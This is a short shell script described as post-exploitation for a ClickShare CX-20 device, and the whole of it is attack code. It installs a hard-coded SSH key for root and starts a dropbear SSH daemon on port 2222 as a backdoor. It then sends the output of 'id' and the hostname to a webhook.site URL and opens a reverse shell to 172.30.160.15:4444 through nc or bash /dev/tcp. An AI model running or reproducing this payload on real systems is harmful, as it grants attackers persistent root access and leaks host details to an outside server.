#!/bin/sh
# ClickShare CX-20 post-exploitation: root shell access
KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlljVb06O2FOLgFpgGCbsgKHvdkad6EQ37pr5QyTfFD tomaszlis@Mac.local"
mkdir -p /root/.ssh /etc/dropbear
echo "$KEY" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
# dropbear on 2222 (device already ships /etc/dropbear)
if [ -x /usr/sbin/dropbear ]; then /usr/sbin/dropbear -p 2222 -r /etc/dropbear/dropbear_rsa_host_key 2>/dev/null; fi
if [ -x /etc/init.d/dropbear ]; then /etc/init.d/dropbear start 2>/dev/null; fi
# proof + reverse shell to jumpvm
(curl -s -m 5 "https://webhook.site/c7b10235-199e-45d3-89bd-2f53b4ecab6d?t=RCE&v=$(id 2>&1 | head -c 100)&h=$(hostname)") >/dev/null 2>&1
(nc 172.30.160.15 4444 -e /bin/sh 2>/dev/null || (bash -i >& /dev/tcp/172.30.160.15/4444 0>&1)) >/dev/null 2>&1 &
